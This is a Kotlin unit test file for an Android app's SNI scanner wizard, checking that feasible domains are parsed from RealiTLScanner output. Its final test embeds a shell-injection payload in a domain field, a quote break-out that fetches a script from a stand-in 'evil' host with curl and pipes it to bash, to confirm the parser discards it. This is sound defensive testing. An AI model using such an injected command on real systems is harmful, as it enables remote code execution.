package app.nukemichi.android.feature.wizard

import app.nukemichi.android.core.ssh.model.CommandResult
import app.nukemichi.android.feature.wizard.impl.domain.ssh.ScanSniCommand
import org.junit.Assert.assertEquals
import org.junit.Test

class ScanSniCommandTest {

    @Test
    fun `parses feasible domains from scanner output`() {
        val stdout = """
            2024/02/08 20:51:10 INFO Started all scanning threads time=2024-02-08T20:51:10.017+08:00
            2024/02/08 20:51:10 INFO Connected to target feasible=true host=107.172.103.9 tls=1.3 alpn=h2 domain=rocky-linux.tk issuer="Let's Encrypt"
            2024/02/08 20:51:11 INFO Connected to target feasible=false host=107.172.103.10 tls=1.2 alpn= domain=old-tls.example issuer="Let's Encrypt"
            2024/02/08 20:51:13 INFO Connected to target feasible=true host=107.172.103.16 tls=1.3 alpn=h2 domain=san.hiddify01.foshou.vip issuer="Let's Encrypt"
            2024/02/08 20:51:38 INFO Scanning completed time=2024-02-08T20:51:38.988+08:00 elapsed=28.97043s
        """.trimIndent()

        val result = ScanSniCommand(architecture = "64").parseOutput(CommandResult(stdout, "", 0))

        assertEquals(listOf("rocky-linux.tk", "san.hiddify01.foshou.vip"), result)
    }

    @Test
    fun `returns an empty list when nothing is feasible`() {
        val stdout = "2024/02/08 20:51:38 INFO Scanning completed elapsed=1s"
        val result = ScanSniCommand(architecture = "arm64-v8a").parseOutput(CommandResult(stdout, "", 0))
        assertEquals(emptyList<String>(), result)
    }

    /**
     * A neighbor on the VPS's own /24 controls what its own certificate's CN/SAN says, and
     * RealiTLScanner echoes that back verbatim as "domain=<value>" with no validation of its own.
     * A malicious one could shape that value to break out of the shell script
     * VerifySniCandidateCommand later builds around a scanned candidate, so it must never reach
     * that class in the first place.
     */
    @Test
    fun `drops a feasible candidate carrying shell metacharacters`() {
        val stdout = """
            INFO Connected to target feasible=true host=1.2.3.4 tls=1.3 alpn=h2 domain=rocky-linux.tk issuer="Let's Encrypt"
            INFO Connected to target feasible=true host=1.2.3.5 tls=1.3 alpn=h2 domain=x";curl${'$'}{IFS}http://evil/sh|bash;echo" issuer="Let's Encrypt"
        """.trimIndent()

        val result = ScanSniCommand(architecture = "64").parseOutput(CommandResult(stdout, "", 0))

        assertEquals(listOf("rocky-linux.tk"), result)
    }
}
